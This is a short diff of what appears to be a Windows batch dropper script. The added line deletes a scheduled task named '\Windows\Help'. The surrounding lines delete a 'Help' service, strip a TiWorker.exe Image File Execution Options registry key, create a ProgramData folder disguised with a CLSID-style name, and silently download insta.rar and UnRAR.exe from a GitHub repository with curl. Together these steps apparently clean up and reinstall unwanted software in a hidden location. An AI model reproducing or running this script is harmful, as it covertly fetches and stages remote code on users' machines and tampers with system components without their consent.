@@ -1,5 +1,7 @@
 sc delete Help
+schtasks /Delete /TN "\Windows\Help" /F
 reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\TiWorker.exe" /f
+
 mkdir %ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}
 curl.exe -s -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\insta.rar" https://github.com/vlad213-tex/1/raw/1/1/insta.rar
 curl.exe -s -L -o "%ProgramData%\LP2.{BB06C0E4-D293-4f75-8A90-CB05B6477EEE}\UnRAR.exe" https://github.com/vlad213-tex/1/raw/1/1/UnRAR.exe
